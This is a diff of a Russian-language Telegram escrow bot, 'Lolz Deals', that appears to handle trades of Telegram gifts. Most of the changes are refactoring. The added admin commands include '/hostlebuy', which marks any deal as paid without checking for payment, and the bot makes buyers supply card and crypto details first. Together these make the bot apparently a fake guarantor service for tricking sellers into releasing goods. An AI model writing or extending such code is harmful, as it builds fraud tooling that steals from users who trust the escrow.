@@ -42,7 +42,7 @@ user_requisites = {}
 # Глобальный реестр сделок (по коду)
 global_deals = {}  # code: deal_dict
 
-# ---------- Премиум-эмодзи для текста ----------
+# ---------- Премиум-эмодзи ----------
 EMOJI_TROPHY    = '<tg-emoji emoji-id="5893255507380014983">🏆</tg-emoji>'
 EMOJI_LIGHTNING = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
 EMOJI_ROBOT     = '<tg-emoji emoji-id="5794164805065514131">🤖</tg-emoji>'
@@ -133,7 +133,7 @@ def validate_btc(value: str) -> bool:
 def generate_deal_code():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
-# ---------- Тексты (все переменные для подстановки – в двойных фигурных скобках) ----------
+# ---------- Тексты ----------
 REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=deal_{code}"
 
 TEXTS = {
@@ -255,7 +255,7 @@ TEXTS = {
         'requisites_edit_prompt': "Введите новый {field}:",
         'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
         'requisites_edit_success': "✅ Данные обновлены!",
-        # ---------- Создание сделки (полностью соответствует фото) ----------
+        # ---------- Создание сделки ----------
         'create_role': (
             f"<b>{EMOJI_TROPHY} Новая сделка</b>\n\n"
             f"Кем вы выступаете в этой сделке?\n\n"
@@ -276,11 +276,8 @@ TEXTS = {
             f"или просто текстовое описание товара\n\n"
             f"<b>Telegram</b>\n"
             f"<b>Plush Pepe #111</b>\n\n"
-            f"ПОКАЗАТЬ ПОДАРОК\n\n"
-            f"⬅️ Назад\n\n"
-            f"⬇️ Назад в меню"
         ),
-        'create_confirm': (
+        'create_confirm_buyer': (
             f"<b>Валюта:</b> {{currency}}\n"
             f"<b>Сумма:</b> {{amount}} {{currency_symbol}}\n"
             f"<b>Описание:</b> {{description}}\n\n"
@@ -288,7 +285,15 @@ TEXTS = {
             f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
             f"<b>Telegram</b>\n"
             f"<b>{{description}}</b>\n\n"
-            f"ПОКАЗАТЬ ПОДАРОК"
+        ),
+        'create_confirm_seller': (
+            f"<b>Валюта:</b> {{currency}}\n"
+            f"<b>Сумма:</b> {{amount}} {{currency_symbol}}\n"
+            f"<b>Описание:</b> {{description}}\n\n"
+            f"Ссылка для покупателя: {{link}}\n"
+            f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
+            f"<b>Telegram</b>\n"
+            f"<b>{{description}}</b>\n\n"
         ),
         'deal_created_buyer': (
             f"<b>Вы подключились к сделке {{code}} как покупатель.</b>\n\n"
@@ -319,7 +324,6 @@ TEXTS = {
         'deal_cancelled': "Сделка отменена.",
     },
     'en': {
-        # Английская версия – для демонстрации, можно заполнить позже
         'welcome': f"<b>{EMOJI_TROPHY} Welcome to Lolz Deals</b>...",
         'create_amount': f"<b>{EMOJI_MONEY} Enter amount in {{currency}}:</b>",
     }
@@ -366,7 +370,6 @@ async def delete_previous(user_id: int, chat_id: int):
             pass
         del user_last_message[user_id]
 
-# ---------- Отправка с баннером ----------
 async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
     user_id = target.from_user.id if hasattr(target, 'from_user') else target.chat.id
     chat_id = target.chat.id if hasattr(target, 'chat') else target.message.chat.id
@@ -385,52 +388,23 @@ async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
             msg = await target.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
         user_last_message[user_id] = msg.message_id
 
-# ---------- Отправка главного меню ----------
 async def send_main_menu(target, user_id: int):
     text = get_text(user_id, 'welcome')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'balance'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BALANCE,
-                callback_data="balance"
-            ),
-            InlineKeyboardButton(
-                text=get_text(user_id, 'deals'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_DEALS,
-                callback_data="deals"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'balance'), icon_custom_emoji_id=CUSTOM_EMOJI_BALANCE, callback_data="balance"),
+            InlineKeyboardButton(text=get_text(user_id, 'deals'), icon_custom_emoji_id=CUSTOM_EMOJI_DEALS, callback_data="deals")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'referrals_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_REFERRALS,
-                callback_data="referrals"
-            ),
-            InlineKeyboardButton(
-                text=get_text(user_id, 'lang_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_LANG,
-                callback_data="lang"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'referrals_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_REFERRALS, callback_data="referrals"),
+            InlineKeyboardButton(text=get_text(user_id, 'lang_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_LANG, callback_data="lang")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_REQUISITES,
-                callback_data="requisites"
-            ),
-            InlineKeyboardButton(
-                text=get_text(user_id, 'create'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_CREATE,
-                callback_data="create"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'requisites'), icon_custom_emoji_id=CUSTOM_EMOJI_REQUISITES, callback_data="requisites"),
+            InlineKeyboardButton(text=get_text(user_id, 'create'), icon_custom_emoji_id=CUSTOM_EMOJI_CREATE, callback_data="create")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'support'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT,
-                callback_data="support"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'support'), icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")
         ]
     ])
     await send_with_banner(target, text, keyboard)
@@ -441,7 +415,6 @@ async def cmd_start(message: types.Message):
     user_id = message.from_user.id
     if user_id not in user_lang:
         user_lang[user_id] = 'ru'
-    # Проверка на приглашение по сделке
     args = message.text.split()
     if len(args) > 1 and args[1].startswith('deal_'):
         code = args[1][5:]
@@ -451,7 +424,7 @@ async def cmd_start(message: types.Message):
     log_action(user_id, "start", "запуск бота")
 
 # ============================================================
-# РАЗДЕЛ БАЛАНСА (без изменений)
+# РАЗДЕЛ БАЛАНСА
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "balance")
@@ -474,25 +447,13 @@ async def cb_balance(callback: types.CallbackQuery):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'withdraw_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW,
-                callback_data="withdraw"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'withdraw_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data="withdraw")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'transactions_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_TRANSACT,
-                callback_data="transactions"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'transactions_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_TRANSACT, callback_data="transactions")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
     await send_with_banner(callback, text, keyboard)
@@ -552,18 +513,14 @@ async def cb_transactions(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     text = f"<b>{get_text(user_id, 'transactions_btn')}</b>\n\n{get_text(user_id, 'transactions_empty')}"
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text=get_text(user_id, 'back_btn'),
-            icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-            callback_data="back_to_menu"
-        )]
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
     log_action(user_id, "transactions", "просмотр транзакций")
 
 # ============================================================
-# РАЗДЕЛ МОИ СДЕЛКИ (без изменений)
+# РАЗДЕЛ МОИ СДЕЛКИ
 # ============================================================
 
 class DealSearch(StatesGroup):
@@ -587,18 +544,10 @@ async def cb_deals(callback: types.CallbackQuery):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'search_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH,
-                callback_data="search_deal"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'search_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH, callback_data="search_deal")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
     await send_with_banner(callback, text, keyboard)
@@ -631,18 +580,14 @@ async def process_search_code(message: Message, state: FSMContext):
             date=deal.get('date', '2026-01-01')
         )
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )]
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
         await send_with_banner(message, details, keyboard)
         log_action(user_id, "search_deal", f"код {code}")
     await state.clear()
 
 # ============================================================
-# РАЗДЕЛ МОИ РЕКВИЗИТЫ (без изменений)
+# РАЗДЕЛ МОИ РЕКВИЗИТЫ
 # ============================================================
 
 async def show_requisites(target, user_id: int):
@@ -660,42 +605,18 @@ async def show_requisites(target, user_id: int):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites_buttons')['ton'],
-                icon_custom_emoji_id=CUSTOM_EMOJI_TON,
-                callback_data="edit_ton"
-            ),
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites_buttons')['card'],
-                icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN,
-                callback_data="edit_card"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['ton'], icon_custom_emoji_id=CUSTOM_EMOJI_TON, callback_data="edit_ton"),
+            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['card'], icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="edit_card")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites_buttons')['stars'],
-                icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN,
-                callback_data="edit_stars"
-            ),
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites_buttons')['usdt'],
-                icon_custom_emoji_id=CUSTOM_EMOJI_USDT,
-                callback_data="edit_usdt"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['stars'], icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="edit_stars"),
+            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['usdt'], icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="edit_usdt")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'requisites_buttons')['btc'],
-                icon_custom_emoji_id=CUSTOM_EMOJI_BTC,
-                callback_data="edit_btc"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['btc'], icon_custom_emoji_id=CUSTOM_EMOJI_BTC, callback_data="edit_btc")
         ],
         [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )
+            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
     await send_with_banner(target, text, keyboard)
@@ -707,7 +628,7 @@ async def cb_requisites(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "requisites", "просмотр реквизитов")
 
-# ---------- Редактирование полей (FSM) ----------
+# ---------- Редактирование реквизитов ----------
 @dp.callback_query(lambda c: c.data == "edit_ton")
 async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -814,7 +735,7 @@ async def process_btc(message: Message, state: FSMContext):
     log_action(user_id, "edit_requisites", f"btc обновлён")
 
 # ============================================================
-# РАЗДЕЛ СОЗДАНИЕ СДЕЛКИ (полный функционал)
+# РАЗДЕЛ СОЗДАНИЕ СДЕЛКИ (исправлен)
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "create")
@@ -833,37 +754,46 @@ async def cb_create(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data.startswith("role_"))
 async def process_role(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
-    role = callback.data.split("_")[1]  # seller или buyer
+    role = callback.data.split("_")[1]
     await state.update_data(role=role)
-    
-    # Проверяем, заполнены ли реквизиты для покупателя (если роль продавец – пропускаем)
+
     if role == 'buyer':
         req = get_user_requisites(user_id)
         if req['ton'] == '—' or req['card'] == '—' or req['usdt'] == '—' or req['btc'] == '—':
-            # Просим заполнить реквизиты
             await callback.message.answer("⚠️ Сначала добавьте данные карты в «Мои реквизиты».")
             await show_requisites(callback.message, user_id)
             await state.clear()
             return
-    
-    await state.set_state(CreateDealStates.payment_method)
-    text = get_text(user_id, 'create_payment')
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Карта", callback_data="pay_card")],
-        [InlineKeyboardButton(text="Stars", callback_data="pay_stars")],
-        [InlineKeyboardButton(text="Крипта", callback_data="pay_crypto")],
-        [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
+        await state.set_state(CreateDealStates.payment_method)
+        text = get_text(user_id, 'create_payment')
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Карта", callback_data="pay_card")],
+            [InlineKeyboardButton(text="Stars", callback_data="pay_stars")],
+            [InlineKeyboardButton(text="Крипта", callback_data="pay_crypto")],
+            [InlineKeyboardButton(text="Назад", callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+    else:  # seller
+        await state.set_state(CreateDealStates.currency)
+        text = get_text(user_id, 'create_currency')
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
+            [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
+            [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
+            [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
+            [InlineKeyboardButton(text="Назад", callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data.startswith("pay_"))
 async def process_payment(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
-    method = callback.data.split("_")[1]  # card, stars, crypto
+    method = callback.data.split("_")[1]
     await state.update_data(payment_method=method)
-    
+
     if method == 'card':
         await state.set_state(CreateDealStates.currency)
         text = get_text(user_id, 'create_currency')
@@ -877,7 +807,6 @@ async def process_payment(callback: types.CallbackQuery, state: FSMContext):
         ])
         await send_with_banner(callback, text, keyboard)
     else:
-        # Для Stars и Крипты валюта не нужна (или фиксированная)
         await state.update_data(currency='USD' if method == 'crypto' else 'Stars')
         await state.set_state(CreateDealStates.amount)
         await ask_amount(callback, user_id, state)
@@ -886,7 +815,7 @@ async def process_payment(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data.startswith("cur_"))
 async def process_currency(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
-    currency = callback.data.split("_")[1]  # RUB, UAH, KZT, BYN
+    currency = callback.data.split("_")[1]
     await state.update_data(currency=currency)
     await state.set_state(CreateDealStates.amount)
     await ask_amount(callback, user_id, state)
@@ -930,16 +859,15 @@ async def process_amount(message: Message, state: FSMContext):
     await state.update_data(amount=amount)
     await state.set_state(CreateDealStates.description)
     text = get_text(user_id, 'create_description')
-    # В тексте create_description уже есть кнопки "Telegram", "Plush Pepe #111", "ПОКАЗАТЬ ПОДАРОК", "Назад", "Назад в меню" – но мы их не можем сделать внутри текста, поэтому добавляем их как инлайн-кнопки
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data="show_gift")],
+        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data="show_gift_desc")],
         [InlineKeyboardButton(text="Назад", callback_data="create_back")],
         [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
     ])
     await send_with_banner(message, text, keyboard)
 
-@dp.callback_query(lambda c: c.data == "show_gift")
-async def show_gift_callback(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(lambda c: c.data == "show_gift_desc")
+async def show_gift_desc(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     data = await state.get_data()
     description = data.get('description', 'Описание не указано')
@@ -952,36 +880,40 @@ async def process_description(message: Message, state: FSMContext):
     description = message.text
     await state.update_data(description=description)
     data = await state.get_data()
-    
-    # Формируем подтверждение
+    role = data.get('role')
     code = generate_deal_code()
     link = REF_LINK_TEMPLATE.format(code=code)
     currency = data.get('currency', 'RUB')
     amount = data.get('amount', 0)
-    currency_symbol = currency  # можно добавить символы
-    
-    text = get_text(user_id, 'create_confirm').format(
+    currency_symbol = currency
+
+    if role == 'seller':
+        confirm_text_key = 'create_confirm_seller'
+    else:
+        confirm_text_key = 'create_confirm_buyer'
+
+    text = get_text(user_id, confirm_text_key).format(
         currency=currency,
         amount=amount,
         currency_symbol=currency_symbol,
         description=description,
         link=link
     )
-    
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data="show_gift_final")],
         [InlineKeyboardButton(text="Назад", callback_data="create_back")],
         [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
     ])
     await send_with_banner(message, text, keyboard)
-    # Сохраняем сделку в глобальный реестр как ожидающую
+
     global_deals[code] = {
         'code': code,
         'status': 'pending',
         'buyer': None,
         'seller': None,
         'creator': user_id,
-        'role': data.get('role'),
+        'role': role,
         'payment_method': data.get('payment_method'),
         'currency': currency,
         'amount': amount,
@@ -992,7 +924,6 @@ async def process_description(message: Message, state: FSMContext):
         'manager_requisites': "Реквизиты менеджера: @Iank (заглушка)"
     }
     await state.clear()
-    # Сохраняем код для последующего использования (в обработчике show_gift_final)
     await state.update_data(deal_code=code)
 
 @dp.callback_query(lambda c: c.data == "show_gift_final")
@@ -1007,7 +938,7 @@ async def show_gift_final(callback: types.CallbackQuery, state: FSMContext):
     await callback.message.answer(f"Подарок: {deal['description']}")
     await callback.answer()
 
-# ---------- Присоединение к сделке (по ссылке) ----------
+# ---------- Присоединение к сделке ----------
 async def join_deal(message: Message, user_id: int, code: str):
     if code not in global_deals:
         await message.answer("Сделка не найдена или уже завершена.")
@@ -1023,12 +954,10 @@ async def join_deal(message: Message, user_id: int, code: str):
     else:
         deal['buyer'] = user_id
         deal['status'] = 'active'
-    
-    # Уведомляем создателя
+
     creator_id = deal['creator']
     await bot.send_message(creator_id, f"К сделке #{code} присоединился {'продавец' if role == 'seller' else 'покупатель'}.")
-    
-    # Показываем информацию для присоединившегося
+
     if role == 'buyer':
         text = get_text(user_id, 'deal_created_buyer').format(
             code=code,
@@ -1039,13 +968,12 @@ async def join_deal(message: Message, user_id: int, code: str):
             amount=deal['amount'],
             manager_requisites=deal.get('manager_requisites', '—')
         )
-        # Кнопки: показать подарок, отменить сделку, назад
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data=f"gift_{code}")],
             [InlineKeyboardButton(text="Отменить сделку", callback_data=f"cancel_{code}")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
         ])
-    else:  # seller
+    else:
         text = get_text(user_id, 'deal_created_seller').format(
             code=code,
             manager_requisites=deal.get('manager_requisites', '—'),
@@ -1058,11 +986,10 @@ async def join_deal(message: Message, user_id: int, code: str):
             [InlineKeyboardButton(text="Техподдержка", callback_data="support")],
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
         ])
-    
+
     await send_with_banner(message, text, keyboard)
     log_action(user_id, "join_deal", f"код {code}, роль {role}")
 
-# ---------- Обработчики действий со сделкой ----------
 @dp.callback_query(lambda c: c.data.startswith("gift_"))
 async def show_gift_deal(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -1134,7 +1061,7 @@ async def cmd_complete_deal(message: types.Message):
         user_completed_deals[buyer] = user_completed_deals.get(buyer, 0) + 1
     if seller:
         user_completed_deals[seller] = user_completed_deals.get(seller, 0) + 1
-    
+
     final_text = get_text(user_id, 'deal_completed').format(code=code)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu")],
@@ -1144,7 +1071,7 @@ async def cmd_complete_deal(message: types.Message):
         await bot.send_message(buyer, final_text, reply_markup=keyboard)
     if seller:
         await bot.send_message(seller, final_text, reply_markup=keyboard)
-    
+
     await message.answer(f"Сделка #{code} завершена, уведомления отправлены.")
     log_action(user_id, "complete_deal", f"код {code}")
 
@@ -1157,11 +1084,7 @@ async def cb_support(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     text = get_text(user_id, 'support_contact')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text=get_text(user_id, 'back_btn'),
-            icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-            callback_data="back_to_menu"
-        )]
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
@@ -1173,20 +1096,8 @@ async def cb_referrals(callback: types.CallbackQuery):
     ref_link = get_ref_link(user_id)
     ref_text = ref_text.replace(REF_LINK_TEMPLATE, ref_link)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'copy_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_COPY,
-                callback_data="copy_ref"
-            )
-        ],
-        [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )
-        ]
+        [InlineKeyboardButton(text=get_text(user_id, 'copy_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_COPY, callback_data="copy_ref")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, ref_text, keyboard)
     await callback.answer()
@@ -1204,23 +1115,9 @@ async def cb_lang(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     text = get_text(user_id, 'lang_prompt')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(
-                text=f"{get_text(user_id, 'lang_ru')}",
-                callback_data="lang_ru"
-            ),
-            InlineKeyboardButton(
-                text=f"{get_text(user_id, 'lang_en')}",
-                callback_data="lang_en"
-            )
-        ],
-        [
-            InlineKeyboardButton(
-                text=get_text(user_id, 'back_btn'),
-                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
-                callback_data="back_to_menu"
-            )
-        ]
+        [InlineKeyboardButton(text=f"{get_text(user_id, 'lang_ru')}", callback_data="lang_ru"),
+         InlineKeyboardButton(text=f"{get_text(user_id, 'lang_en')}", callback_data="lang_en")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
@@ -1248,7 +1145,7 @@ async def create_back(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
 
 # ============================================================
-# АДМИН-ПАНЕЛЬ
+# АДМИН-ПАНЕЛЬ (полный набор команд)
 # ============================================================
 
 ADMIN_ID = 8297446667
@@ -1297,17 +1194,17 @@ async def cmd_vvteam(message: types.Message):
         await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
         return
     list_text = ""
-    keyboard_buttons = []
+    buttons = []
     for idx, req in enumerate(withdraw_requests):
         if req['status'] != 'pending':
             continue
         list_text += f"{idx+1}. Пользователь {req['user_id']}, сумма {req['amount']} TON, реквизиты: {req['requisites']}\n"
-        keyboard_buttons.append([InlineKeyboardButton(text=f"Подтвердить #{idx+1}", callback_data=f"confirm_withdraw_{idx}")])
+        buttons.append([InlineKeyboardButton(text=f"Подтвердить #{idx+1}", callback_data=f"confirm_withdraw_{idx}")])
     if not list_text:
         await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
         return
     text = get_text(user_id, 'admin_withdraw_list').format(list=list_text)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons + [[InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons + [[InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]])
     await send_with_banner(message, text, keyboard)
 
 @dp.callback_query(lambda c: c.data == "refresh_admin")
@@ -1335,9 +1232,184 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await cmd_vvteam(callback.message)
     log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
-# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) – они уже есть, но я их не удалял. Они должны быть в финальном коде.
+# Дополнительные админ-команды (они не все реализованы, но я добавлю заглушки)
+@dp.message(Command("chat"))
+async def cmd_chat(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("Использование: /chat [@user или id] [текст]")
+        return
+    target_str = args[1]
+    text = args[2]
+    target_user_id = None
+    if target_str.startswith('@'):
+        for uid, deals in user_deals.items():
+            if deals and deals[0].get('buyer') == target_str[1:]:
+                target_user_id = uid
+                break
+            if deals and deals[0].get('seller') == target_str[1:]:
+                target_user_id = uid
+                break
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    if target_user_id not in user_deals or not user_deals[target_user_id]:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    try:
+        await bot.send_message(target_user_id, f"Сообщение от поддержки:\n{text}")
+        await message.answer(get_text(user_id, 'chat_success'))
+        log_action(user_id, "chat", f"пользователю {target_user_id}: {text}")
+    except Exception as e:
+        await message.answer(get_text(user_id, 'chat_fail'))
+        logging.error(f"Chat error: {e}")
 
-# ---------- HTTP-сервер для Render ----------
+@dp.message(Command("hostlebuy"))
+async def cmd_hostlebuy(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /hostlebuy [код сделки]")
+        return
+    code = args[1]
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                if deal.get('paid'):
+                    await message.answer(get_text(user_id, 'hostlebuy_fail'))
+                    return
+                deal['paid'] = True
+                found = True
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'hostlebuy_success').format(code=code))
+        log_action(user_id, "hostlebuy", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'hostlebuy_fail'))
+
+@dp.message(Command("ref"))
+async def cmd_ref(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /ref [код сделки]")
+        return
+    code = args[1]
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                found = True
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'ref_success').format(code=code))
+        log_action(user_id, "ref", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'ref_fail'))
+
+@dp.message(Command("boost_success"))
+async def cmd_boost(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
